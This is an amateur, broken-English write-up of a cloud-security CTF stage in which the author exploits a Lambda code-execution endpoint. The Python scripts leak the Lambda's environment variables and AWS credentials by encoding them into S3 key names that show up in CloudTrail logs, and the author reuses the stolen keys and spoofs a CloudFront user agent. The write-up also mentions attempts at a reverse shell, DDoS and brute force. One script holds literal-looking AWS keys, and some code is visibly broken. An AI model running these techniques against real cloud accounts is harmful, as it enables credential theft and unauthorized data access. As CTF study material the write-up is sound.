Hello to everebody.
this is a write-up for the Stage 2 of the CLOUD ESCAPE CTF competition from the MAFAT.

I didnt passed until end this stage but i have a very good idea that solve all question that i hve unlit thr rnd of the competition.
So when i will end my real explenation i will describe what a final solutio ni think is.



After a Endidn Stage 1 we can a permision to open a Stage 2 and we get this inforafantion:

    Agent 008, Your Next Objective.
    Commendable work on solving the first challenge, Agent. You've successfully passed Stage One. However, Operation CloudEscape is not done just yet. New intelligence has surfaced, outlining your next set of challenges and available assets.
    Our intelligence has identified a developer and discovered some of his development tools: 
    1. A test site he created. 
    2. A Lambda function accessible via an API Gateway. It operates inside a restrictive VPC, with its only outbound communication channel being an S3 endpoint. He uses it to test Python scripts in a private environment.
    3. Two mysterious S3 buckets which we currently have no information on.
    Technical Briefing & Assets
    Lambda Function Interaction Protocol:
    You can deploy and execute arbitrary Python code via the designated Lambda. Use the following curl command (or Postman) to execute code in the Lambda through the API, Ensure your Python code is Base64 encoded.

            curl --location '<api_url>/dev/code_exec' \
            --header 'Content-Type: application/json' \
            --header 'X-Amz-Content-Sha256: be...' \
            --header 'X-Amz-Security-Token: IQ...' \
            --header 'X-Amz-Date: 20...' \
            --header 'Authorization: AWS4-HMAC-SHA256 Credential=ASIA.../.../us-east-1/execute-api/aws4_request, SignedHeaders=content-length;content-type;host;x-amz-content-sha256;x-amz-date;x-amz-security-token, Signature=18...' \
            --data '{"code" : "<your base64 encoded python code>"}'
    Key Asset Identifiers:

    The Test Site's URL: [Click Here](https://xxxxx.cloudfront.net)
    API URL: https://xxxxxx.execute-api.us-east-1.amazonaws.com/dev/code_exec
    Identified Bucket 1: userxxxxxxxxxxexxx
    Identified Bucket 2: logxxxxxxxxxxxxxxx
    All necessary parameters for this phase have been provided. Your mission is to analyze these systems, exploit any vulnerabilities, and retrieve the objective data.
    The following tokens are provided and will grant you initial entry to the victim cloud environment, use them wisely!

and a Private Token for AWS that updataded each houre.

Soooo, start to working!

I start from the Site.

On the Site i see some not so relevant text of some developer and a junior_developer.png file with name:

On it on the background i see a Display of PC wiht opened on it page of docs.html

So i go for the https://xxxxx.cloudfront.net/docs.html and get this page:


    {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "Statement1",
                "Effect": "Allow",
                "Principal": "*",
                "Action": [
                    "s3:GetObject",
                    "s3:ListBucket"
                ],
                "Resource": [
                    "arn:aws:s3:::REDACTED/index.html",
                    "arn:aws:s3:::REDACTED/docs.html",
                    "arn:aws:s3:::REDACTED/junior_developer.png",
                    "arn:aws:s3:::REDACTED"
                ],
                "Condition": {
                    "StringEquals": {
                        "aws:UserAgent": REDACTED
                    }
                }
            },
            {
                "Sid": "Statement2",
                "Principal": "*",
                "Effect": "Allow",
                "Action": [
                    "s3:GetObject",
                    "s3:ListBucket"
                ],
                "Resource": [
                    "arn:aws:s3:::REDACTED/*",
                    "arn:aws:s3:::REDACTED"
                ],
                "Condition": {
                    "StringEquals": {
                        "aws:SourceVpc": REDACTED,
                        "aws:UserAgent": REDACTED
                    }
                }
            }
        ]
    }

So, what we see here. 
we have a 2 SID.
One give a permisosn to get a files:"arn:aws:s3:::REDACTED/index.html",
                    "arn:aws:s3:::REDACTED/docs.html",
                    "arn:aws:s3:::REDACTED/junior_developer.png
and made a list bucket.
In Condition we see that this work only with one specific UserAgent sctring.

Second give a permisions to get all files from this bucket and to made a list.
Condition is only with one specific UserAgent sctring + from the specific SourceVpc host.

And we dont know what name of the Bucket.


So,so,so.
We need to find a UserAgent to made a request from some VPC to some bucket. not a big part of inforamtion.

Okey.Lest move to the next part.
Token.

i made a :

    export AWS_ACCESS_KEY_ID=xxxxxxxxxx
    export AWS_SECRET_ACCESS_KEY=x+xxxxxxxxxxxxxxxxxxx
    export AWS_SESSION_TOKEN=xxxxxxxxxxxxxxxxxxxx.

    aws sts get-caller-identity

And Get:

{
    "UserId": "xxxxxxxxxx:xxxxxxxxx",
    "Account": "xxxxxxxxxxx",
    "Arn": "arn:aws:sts::xxxxx:assumed-role/ctf_participant_role/xxxxx"
}

Okey, token work and we are a ctf_participant_role.

So i maded some request of S3 and IAM for the bucket that we get from the Question:

ListObjectsV2 on user8a25e3d93df9ec8b → denied (bucket policy gate)
ListObjectsV2/ls on log8a25e3d93df9ec8b → works, shows a user8a25e3d93df9ec8b/ prefix inside it
GetObject on user8a25e3d93df9ec8b → denied (bucket policy gate)
GetObject on log8a25e3d93df9ec8b → works
GetBucketPolicy → denied (IAM gate)

And in the the log bucket(logxxxxxxxxxxxxxxx) i see some logs. I check it and see that this is a Cloud Trail log of Acces Denied of my user to my previous check with some data in it.

    {"version": "0", "id": "xxxx", "detail-type": "AWS API Call via CloudTrail", "source": "aws.s3", "account": "xxxx", "time": "xxx:38:05Z", "region": "us-east-1", "resources": [], "detail": {"eventVersion": "1.11", "userIdentity": {"type": "AWSAccount", "principalId": "xxxx:xxxx", "accountId": "xxxx"}, "eventTime": "xxxx:38:05Z", "eventSource": "s3.amazonaws.com", "eventName": "ListObjects", "awsRegion": "us-east-1", "sourceIPAddress": "xxxxx", "userAgent": "[aws-cli/2.36.17 md/awscrt#0.36.0 ua/2.1 os/linux#6.19.14+kali-amd64 md/arch#x86_64 lang/python#3.14.6 md/pyimpl#CPython m/Z,g,E,C,b cfg/retry-mode#standard md/installer#exe sid/4c55b1738b6d md/distrib#kali.2026 md/prompt#off md/command#s3.ls]", "errorCode": "AccessDenied", "errorMessage": "User: arn:aws:sts::xxxx:assumed-role/ctf_participant_role/xxxxx is not authorized to perform: s3:ListBucket on resource: \"arn:aws:s3:::user8a25e3d93df9ec8b\" because no resource-based policy allows the s3:ListBucket action", "requestParameters": {"list-type": "2", "bucketName": "user8a25e3d93df9ec8b", "encoding-type": "url", "prefix": "", "delimiter": "/", "Host": "user8a25e3d93df9ec8b.s3.amazonaws.com"}, "responseElements": null, "additionalEventData": {"SignatureVersion": "SigV4", "CipherSuite": "TLS_AES_128_GCM_SHA256", "bytesTransferredIn": 0, "AuthenticationMethod": "AuthHeader", "x-amz-id-2": "xxxxx", "bytesTransferredOut": 486}, "requestID": "xxxx", "eventID": "xxxxe", "readOnly": true, "resources": [{"accountId": "xx", "type": "AWS::S3::Bucket", "ARN": "arn:aws:s3:::user8a25e3d93df9ec8b"}, {"type": "AWS::S3::Object", "ARNPrefix": "arn:aws:s3:::user8a25e3d93df9ec8b/"}], "eventType": "AwsApiCall", "managementEvent": false, "recipientAccountId": "xx", "sharedEventID": "xxxxx", "eventCategory": "Data", "tlsDetails": {"tlsVersion": "TLSv1.3", "cipherSuite": "TLS_AES_128_GCM_SHA256", "clientProvidedHostHeader": "user8a25e3d93df9ec8b.s3.amazonaws.com"}}}

Not so interesting but here we see a some output.Ouput this Good. Output this Perfect.Output mean that is a option to get some new info.


So, for now we understand tha tif we get Access Denied for userxxxxxxxx we get this log on hte logxxxxxxx bucket.

Now lets talk about API.

For use a Api Execution i need to made from my code a base64 line and send it to the Api Host wiht athe link.

I used a program with name

    awscurl

made to send a request i made a export of the credential that i get from the site like:

    export AWS_ACCESS_KEY_ID=xxxxxxxxxx
    export AWS_SECRET_ACCESS_KEY=x+xxxxxxxxxxxxxxxxxxx
    export AWS_SESSION_TOKEN=xxxxxxxxxxxxxxxxxxxx.

and made:

    awscurl --service execute-api --region us-east-1 \
    --access_key "$AWS_ACCESS_KEY_ID" \
    --secret_key "$AWS_SECRET_ACCESS_KEY" \
    --security_token "$AWS_SESSION_TOKEN" \
    -X POST \
    -H "Content-Type: application/json" \
    --data "{\"code\": \"$(base64 -w0 payload.py)\"}" \
    https://xxxxxx.execute-api.us-east-1.amazonaws.com/dev/code_exec

I maded a cod ethat check a STS Id of acoount that i run from it a commnads and try to made a list and get policy for the userxxxxx bucket:

import boto3, json

result = {}

# 1. Who does the Lambda run as?
try:
    sts = boto3.client('sts')
    result['identity'] = sts.get_caller_identity()
except Exception as e:
    result['identity_error'] = str(e)

# 2. Try listing the user bucket from inside the VPC
try:
    s3 = boto3.client('s3')
    resp = s3.list_objects_v2(Bucket='user8a25e3d93df9ec8b')
    result['list_objects'] = resp.get('Contents', [])
except Exception as e:
    result['list_objects_error'] = str(e)

# 3. Try reading the bucket policy (Lambda's role might allow this even if yours doesn't)
try:
    s3 = boto3.client('s3')
    policy = s3.get_bucket_policy(Bucket='user8a25e3d93df9ec8b')
    result['bucket_policy'] = policy['Policy']
except Exception as e:
    result['bucket_policy_error'] = str(e)

print(json.dumps(result, default=str))


And what you think.

I get only responce of {"result":"Code  successfully"}.
Okey i change little my code and broke it....
I get only a {"error":"Something wrong"}.
Bad.

I check the logs of the logxxxxxx bucket. and see a new logs from List and Get-Policy.

I check them and see: User: arn:aws:sts::121774052880:assumed-role/lambdaRole/user_function is not authorized to perform: s3:ListBucket on resource: \"arn:aws:s3:::user8a25e3d93df9ec8b\" because no identity-based policy allows the s3:ListBucket action"

So from the Api Function we run a commands like lambdaRole/user_function.


Okey,but doesnt help to us to get somemore info.

How i can to get output of my commnad that will runed on the Api Host if Output is Like True or False?

Only Output is A log of request fail.How we made from fail some think tha will be succes for us?

I ghave idea. When i made a put request for User bucket. i write a name of file tha ti want to put. What if i cahnge a file name for the variable that will take some output of the commands that i run on the Api Host and will put them insrtead of file name.

    import boto3, subprocess
    from botocore.config import Config

    s3 = boto3.client('s3',
        region_name='us-east-1',
        endpoint_url='https://s3.us-east-1.amazonaws.com',
        config=Config(s3={'addressing_style': 'path'})
    )


    # Capture the error
    error_info = 'none'
    try:
        s3.get_object(Bucket='user8a25e3d93df9ec8b', Key='flag.txt')
    except Exception as e:
        error_info = f"{type(e).__name__}_{str(e)}"

    # Clean for use as S3 key
    error_key = error_info.replace(' ', '_').replace('/', '-').replace(':', '-')[:100]

    # Write error as key name to user bucket (will appear in CloudTrail log)
    try:
        s3.put_object(
            Bucket='user8a25e3d93df9ec8b',
            Key=f'err/{error_key}',
            Body=b'x'
        )
    except:
        pass

And i the log i see in the Key part of log:

    "key": "err/AccessDenied_An_error_occurred_(AccessDenied)_when_calling_the_GetObject_operation-_User-_arn-aws-st"

So now we have a way for the real output of the code.

And I started to check.
I tryed to made a lot of thinks like checking of ALl Aws Command like a user_function for log and user bucket but anythink wasnt working, i get for all thinks a ACCESS DENIED from IAM.
But one of the thinks was working and worked good.
To get data about a host of API.
I can made a ls comand for the file, cat a code of the lamda that start my execution code on base64 and more.

So one of importand thinks tha ti finded is a env variables.
I maded this code:

    import boto3, subprocess, os
    from botocore.config import Config

    s3 = boto3.client('s3',
        region_name='us-east-1',
        endpoint_url='https://s3.us-east-1.amazonaws.com',
        config=Config(s3={'addressing_style': 'path'})
    )
    .meta.events.register('before-send.s3.*', override_ua)


    # Test - env vars
    out2 = '|'.join(os.environ.keys())[:900]
    try:
        s3.put_object(Bucket='user8a25e3d93df9ec8b', Key=f'env/{out2}', Body=b'x')
    except:
        pass


and get in key:

    env/AWS_LAMBDA_FUNCTION_VERSION=$LATEST
    |AWS_EXECUTION_ENV=AWS_Lambda_python3.13
    |AWS_LAMBDA_METADATA_TOKEN=9b066b0b-03fe-47c2-9b61-59d2057d788a
    |AWS_DEFAULT_REGION=us-east-1|AWS_LAMBDA_LOG_STREAM_NAME=2026_08_08_[$LATEST]72ff54cfc8da40ecac7783b781764e46
    |AWS_REGION=us-east-1
    |PWD=_var_task
    |_HANDLER=lambda_function.lambda_handler
    |TZ=:UTC
    |LAMBDA_TASK_ROOT=_var_task
    |LANG=en_US.UTF-8
    |AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxx|AWS_LAMBDA_LOG_GROUP_NAME=_aws_lambda_user_function|AWS_LAMBDA_RUNTIME_API=169.254.100.1:9001|
    AWS_LAMBDA_METADATA_API=169.254.100.1:9001|AWS_LAMBDA_FUNCTION_MEMORY_SIZE=512
    |LAMBDA_RUNTIME_DIR=_var_runtime
    |_AWS_XRAY_DAEMON_ADDRESS=169.254.100.1
    |AWS_XRAY_DAEMON_ADDRESS=169.254.100.1:2000|SHLVL=0|AWS_ACCESS_KEY_ID=xxxxxxxxxxx|LD_LIBRARY_PATH=_var_lang_lib:_lib64:_usr_lib64:_var_runtime:_var_runtime_lib:_var_task:_var_task_lib:_opt_lib|AWS_LAMBDA_FUNCTI


Wou,we see here a 2 keys like i get from the Site of CTF.So that mean we can get them and use them from my local PC.We see a:
|AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxx|
AWS_ACCESS_KEY_ID=xxxxxxxxxxx|
so wee need to find a full AWS_SESSION_TOKEN to get a full tokens.

So maded a new script that get a 3 tokens. Because AWS_SESSION_TOKEN is very big i part it to couple of PutObject rquests.

    import boto3
    from botocore.config import Config

    s3out = boto3.client('s3',
        region_name='us-east-1',
        endpoint_url='https://s3.us-east-1.amazonaws.com',
        config=Config(s3={'addressing_style': 'path'})
    )
    def override_ua(request, **kwargs):
        request.headers['User-Agent'] = 'Amazon CloudFront'
    s3out.meta.events.register('before-send.s3.*', override_ua)

    try:
        resp = s3out.get_object(Bucket='site7a7d8ab6d6e8383a', Key='flag.txt')
        result = resp['Body'].read().decode()
        key = f'flag/SUCCESS_{result[:200]}'
    except Exception as e:
        key = f'flag/ERR_{type(e).__name__}_{str(e)[:150]}'

    key = key.replace(' ','_').replace('\n','|').replace('/','_').replace(':','-')[:900]
    try:
        s3out.put_object(Bucket='user8a25e3d93df9ec8b', Key=key, Body=b'x')
    except:
        pass


so after that we made a aws s3 cp s3://logggxxxx  for all new logs and get a token for the user_function.

After that:

    export AWS_ACCESS_KEY_ID="xxxx"
    export AWS_SECRET_ACCESS_KEY="xxxxxx+qxBAlk"
    export AWS_SESSION_TOKEN="$(xxxxxx)"

And Check a Credential for the user_function
aws sts get-caller-identity

Okey, now we can run a commnad from the user_function role.

I tryed a lot of thinks with it but for all my commands (s3,iam,ec2) i get a Access denied.

So i put it on the side.And try to find a UserAgent.

We know that Cloudfront can made a request for the bucket with a index.html and docs.html so ge made a request with the UserAgent that is good for Policy that we finded in the docs.html. 

and when we made a curl -v "https://d4ysu55xg7wfi.cloudfront.net/" 

we get in the Header 

    x-cache: Miss from cloudfront

This means CloudFront made a fresh request to S3 to serve docs.html. But YOUR curl sent User-Agent: curl/8.20.0 — yet it still got a 200. 

And i Think is Because CloudFront makes its OWN request to S3 using ITS OWN User-Agent — not yours. The UA condition in Statement 1 is being satisfied by CloudFront's User-Agent string.

So what is a default Cloud Front User Agent. 
From internet i find that he is a Amazon CloudFront.

I tryed another time all request to user and log buvket but now with a Amazon Cloudfront but result was same. All commnad are Acces denied because of IAM of Bcuket policy.

I tryed a lot of ideas after that but they didnt worked and i will not describe each idea but this is most interestinf from them;

    1)Try to made a reverse Shell to my Private Pc from Api.Blocked by Api Host
    
    2)Get a User Agent from the Logs by requestind in som emethonds like curl,aws cli, boto3 from the api and use it to listobject is userxxxxxx bucket

    3)Made a full ffuz for the  UserAgent from the SecureList wordlist for the UserAgent

    4)Try to DDOS a API to get some more info. (And this was worked but this was like a bug and i will not to write here what i get because it not a part of the CTF )

    5)Read all files that are on the Api Host but i didnt finded somethink interesting

    6)Try to made a bruteforce for the (variable)xxxxxxxxx bucket. Because i dont think that flag is on the user or log bucket and they have the same xxxxxxxx end. So was option if i change a user for some another part i will finf a bucket.

So this was a last point of my adventure.

BUUUUUUUTTTT this is not end.

After i started to write a full write-up i understand that i tryed a commmands :

aws cloudfront list-distributions
aws cloudfront list-functions
aws cloudfront list-origin-access-controls

Only from the ctf_partition user but not fro a user_lamda. 

So is a option that in it i was findind a Site bucket and made a request from Api hand with my base64 request with UserAgent Amazon CloudFront to get a flag.txt.

    import boto3, urllib.request, urllib.error
    from botocore.config import Config

    
    # Paste your credentials here
    AWS_KEY = 'ASIARYWSMSYIA7ZFOFWY'
    AWS_SECRET = 'XNAzN9L9M2JVj3BRMIzbcnAT9P3Rj1H3f+qxBAlk'
    AWS_TOKEN = open('/tmp/token3.txt').read().strip()

    s3 = boto3.client('s3',
        region_name='us-east-1'
    )

    s3out = boto3.client('s3',
        region_name='us-east-1',
        endpoint_url='https://s3.us-east-1.amazonaws.com',
        config=Config(s3={'addressing_style': 'path'})
    )
    def override_ua(request, **kwargs):
        request.headers['User-Agent'] = 'Amazon CloudFront'
    s3out.meta.events.register('before-send.s3.*', override_ua)

    try:
        resp = s3.get_object(Bucket='site7a7d8ab6d6e8383a', Key='flag.txt')
        result = resp['Body'].read().decode()
        key = f'flag2/SUCCESS_{result[:200]}'
    except Exception as e:
        key = f'flag2/ERR_{type(e).__name__}_{str(e)[:150]}'

    key = key.replace(' ','_').replace('\n','|').replace('/','_').replace(':','-')[:900]
    try:
        s3out.put_object(Bucket='user8a25e3d93df9ec8b', Key=key, Body=b'x')
    except:
        pass

ANd if this was doesnt working i was tryed to made the same but with Export in the base64 my Token of ctf_partition.


    import boto3, urllib.request, urllib.error
    from botocore.config import Config

    # Paste your credentials here
    AWS_KEY = 'XXXXX'
    AWS_SECRET = 'XXXXXXXX'
    AWS_TOKEN = 'XXXXXXXXXX'

    s3 = boto3.client('s3',
        aws_access_key_id=AWS_KEY,
        aws_secret_access_key=AWS_SECRET,
        aws_session_token=AWS_TOKEN,
        region_name='us-east-1'
    )

    s3out = boto3.client('s3',
        region_name='us-east-1',
        endpoint_url='https://s3.us-east-1.amazonaws.com',
        config=Config(s3={'addressing_style': 'path'})
    )
    def override_ua(request, **kwargs):
        request.headers['User-Agent'] = 'Amazon CloudFront'
    s3out.meta.events.register('before-send.s3.*', override_ua)

    try:
        resp = s3.get_object(Bucket='site7a7d8ab6d6e8383a', Key='flag.txt')
        result = resp['Body'].read().decode()
        key = f'flag2/SUCCESS_{result[:200]}'
    except Exception as e:
        key = f'flag2/ERR_{type(e).__name__}_{str(e)[:150]}'

    key = key.replace(' ','_').replace('\n','|').replace('/','_').replace(':','-')[:900]
    try:
        s3out.put_object(Bucket='user8a25e3d93df9ec8b', Key=key, Body=b'x')
    except:
        pass
        

        
For now i think this is a Solution for this CTF Stage.